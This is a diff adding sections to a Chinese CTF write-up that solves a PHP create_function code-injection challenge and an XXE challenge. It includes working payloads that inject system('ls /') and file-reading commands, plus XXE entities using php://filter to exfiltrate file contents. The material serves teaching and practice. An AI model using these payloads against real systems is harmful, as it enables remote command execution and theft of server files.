@@ -1050,6 +1050,8 @@ system被禁，我们用passthru
 
 得到flag
 
+<div style="page-break-after:always"></div>
+
 ------
 
 ## 中等部分
@@ -1166,8 +1168,138 @@ $query="user/username[@name='']|//*|//*['';
 
 就可以列出所有内容，得到flag
 
+<div style="page-break-after:always"></div>
+
 ------
 
 ### 某函数的复仇
 
 ![image-20240126120759761](照片/image-20240126120759761.png)
+
+分析代码
+
+```
+preg_match('/^[a-z_]*$/isD',$shaw)//开头为字母、下划线以及结尾不允许换行
+$shaw('',$root);//create_function匿名函数代码注入
+/i不区分大小写
+
+/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]
+
+/D如果使用$限制结尾字符,则不允许结尾有换行;
+
+对于^开头，$结尾的正则，如果用.进行任意字符匹配，那么则不包括换行符
+
+```
+
+create_function函数
+
+```php
+语法：
+ 
+create_function(string $args,  string $code)
+ 
+string $args 声明的函数变量部分
+ 
+string $code 执行的方法代码部分
+
+例如：
+<?php
+error_reporting(0);
+$sort_by = $_GET['sort_by'];
+$sorter = 'strnatcasecmp';
+$databases=array('1234','4321');
+$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
+usort($databases, create_function('$a, $b', $sort_function));
+?>
+
+当构建payload为
+'"]);}phpinfo();/*
+
+实际的组合过程为
+$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by '"]);}phpinfo();/*
+ 将前面的闭合并执行phpinfo的命令   
+```
+
+本题中
+
+```
+我们要post传入一个
+
+create_function()
+
+$shaw('',$root);
+题目就变成了
+create_function('', $root)
+
+get传入来查询目录，}用来闭合前面的函数
+1;}system('ls /');/*
+```
+
+![image-20240130135238377](照片/image-20240130135238377.png)
+
+然后post传参不变，构建get命令读取flag
+
+```
+1;}system('more /f*');/*
+```
+
+得到flag
+
+![image-20240130135359533](照片/image-20240130135359533.png)
+
+------
+
+### xxe
+
+先了解一下什么是xxe
+
+https://blog.csdn.net/weixin_44420143/article/details/118721145
+
+XXE(XML External Entity Injection)全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string()。
+
+dirsearch扫描发先dom.php
+
+![image-20240130140502957](照片/image-20240130140502957.png)
+
+访问查看
+
+![image-20240130140548182](照片/image-20240130140548182.png)
+
+发现有各类的配置信息出现，直接利用该文件发送xml语句
+
+```
+文件读取的利用和payload非常好理解，即使用file协议读取文件内容，并输出到页面上（有回显的情况）。
+
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=读取的文件名" >]>
+<root>
+<name>&xxe;</name>
+</root>
+```
+
+这里根据一开始实例的提示，flag在flagggg.php，直接利用伪协议读取该文件
+
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flagggg.php" >]>
+<root>
+<name>&xxe;</name>
+</root>
+```
+
+![image-20240130141737337](照片/image-20240130141737337.png)
+
+得到base64编码的flag
+
+![image-20240130141808890](照片/image-20240130141808890.png)
+
+解码得到flag
+
+![image-20240130141821388](照片/image-20240130141821388.png)
+
+------
+
